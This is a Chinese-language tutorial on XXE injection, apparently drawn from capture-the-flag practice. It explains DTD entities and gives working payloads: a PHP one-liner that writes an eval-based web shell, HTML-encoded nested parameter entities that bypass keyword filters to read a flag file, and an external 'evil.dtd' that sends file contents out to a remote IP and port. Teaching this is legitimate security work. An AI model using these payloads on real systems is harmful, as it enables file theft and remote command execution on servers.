# XXE

在网上找了好一会，相关资料甚少，并且都不是很齐全，在这讲讲这两天搞的XXE漏洞

如果上传的数据流能被以xml形式解析就有可能存在XXE漏洞

~~~xml-dtd
一般来说，XML文档是以下这种格式
<?xml version="1.0"?>
<!DOCTYPE FRUIT [
    <!ELEMENT FRUIT (COLOR,NAME,TASTE)>
    <!ELEMENT COLOR (#PCDATA)>
    <!ELEMENT NAME (#PCDATA)>
    <!ELEMENT TASTE (#PCDATA)>
    <!ENTITY A "">
    <!ENTITY B SYSTEM "">
    ]>
<abc>&B</abc>
~~~

从以上代码简单的能看出，xml文件分为几个部分

+ xml头部，展示xml版本信息
+ DOCTYPE部分，此部分是注入的关键，用来引入外部实体达到调用恶意伪协议来任意读取文件。这个部分本意是来确定文档里面的元素声明，如上面这个例子，第三行是定义此文档是`FRUIT`类型的文档，第四行就是讲`FRUIT`这个文档里面有三种元素分别是`COLOR`,`NAME `,`TASTE`
+ 最后就是xml构建出来的模块

## 实体

在这里我们重点讨论实体。其中`ENTITY`叫做实体，实体是用来定义普通文本的变量。实体引用是对实体的引用，用符号`&`表示，后面要加`;`不能忘

~~~dtd
<!ENTITY 实体名称 "实体的值">
<!ENTITY 实体名称 SYSTEM "URI/URL">
<!ENTITY % 实体名称 "实体的值">
~~~

+ 第一行可以用来定义一个套娃的实体，套进去的通过HTML编码能绕过对很多字符串的过滤，如：SYSTEM，FLAG，各种协议.......只要放进去被调用了就会被自动解析里面的编码内容。

+ 第二行就是利用点，能够用各种协议来读取文件目前这个SYSTEM支持的php协议有

  ![image-20221022001741350](/picture/xxe/image-20221022001741350.png)

  + ~~~php
    file://route
    ~~~

  + ~~~php
    php://filter/read=convert.base64-encode/resource=[route]
    ~~~

  + ```php
    #如果有写权限文件的可以试试写马
    <?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
    ```

  + ~~~php
    #主要利用这条来调用要利用服务器上的外部实体
    http://XXX/X.dtd
    ~~~

  + ~~~php
    data://text/plain,
    data://text/plain;base64,
    ~~~

+ 第三行是带`%`的参数实体，所谓参数实体就是这个实体可以被其他实体引用，但是相同的一个包里面的不能互相引用的喔，不知道为什么，留一个悬念。通过外部服务器访问的实体是可以被引用的。

## 绕过&&payload

1. 如果过滤了xml，直接把`<?xml version="1.0"?>`删了即可，xml没那么严格

2. 如果过滤了协议http，file，php，或者SYSTEM这样的字段，可以通过套娃调用HTML编码过的参数实体来绕过。注意，套娃参数实体是不用SYSTEM的，而且套娃的参数实体要先调用一次，不能在服务器端dtd调用，否则报错。如果不调用直接使用是不行的，因为编码的内容不会被解析出来。所以要先调用一下这个`%wble`，然后里面的东东会被解析变成另一个参数实体`<!ENTITY % wbb SYSTEM 'file:///flag'>`，然后再用`%wbb`调用就可以了，一般会用http在服务器端的dtd去调用一个访问的操作。

   具体如下

   ~~~python
   #mian.py
   payload = """<!DOCTYPE test [
   <!ENTITY % wble "&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x77;&#x62;&#x62;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x27;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x66;&#x6c;&#x61;&#x67;&#x27;&#x3e;">
   <!ENTITY % kao "&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x77;&#x61;&#x61;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x31;&#x37;&#x35;&#x2e;&#x31;&#x37;&#x38;&#x2e;&#x31;&#x31;&#x32;&#x2e;&#x31;&#x37;&#x33;&#x2f;&#x68;&#x61;&#x63;&#x6b;&#x2f;&#x61;&#x2e;&#x64;&#x74;&#x64;&#x27;&#x3e;">
   %wble;
   %kao;
   %waa;
   ]>
   <root>123</root>"""
   ~~~

   ~~~python
   #编码部分解释
   "&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x77;&#x62;&#x62;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x27;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x66;&#x6c;&#x61;&#x67;&#x27;&#x3e;"
   |
   +->	<!ENTITY % wbb SYSTEM 'file:///flag'>
   
   "&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x77;&#x61;&#x61;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x31;&#x37;&#x35;&#x2e;&#x31;&#x37;&#x38;&#x2e;&#x31;&#x31;&#x32;&#x2e;&#x31;&#x37;&#x33;&#x2f;&#x68;&#x61;&#x63;&#x6b;&#x2f;&#x61;&#x2e;&#x64;&#x74;&#x64;&#x27;&#x3e;"
   |
   +-><!ENTITY % waa SYSTEM 'http://175.178.112.173/hack/a.dtd'>
   ~~~

   ~~~dtd
   #evil.dtd
   #下面这段加端口号是为了监听方便，把参数实体放后面方便报错回显
   #实体的字符串外面这层一定要用双引号！里面的要用单引号！(反过来也可以)
   #？都用同种符号会报错:DOMDocument::loadXML(): xmlParseEntityDecl: entity dtd not terminated
   #？这个里面套进去的参数实体的&#x25是%的html编码，如果不编码就会报错：DOMDocument::loadXML(): EntityValue: '%' forbidden except for entities references
   #？一定要套娃才能让这个访问生效，直接用一个SYSTEM的去调用会报错：DOMDocument::loadXML(): Invalid URI: http://175.178.112.173:9999/%wbb;
   <!ENTITY % dtd "<!ENTITY &#x25; xxe SYSTEM 'http://175.178.112.173:9999/%wbb;'> ">
   %dtd;
   %xxe;
   ~~~

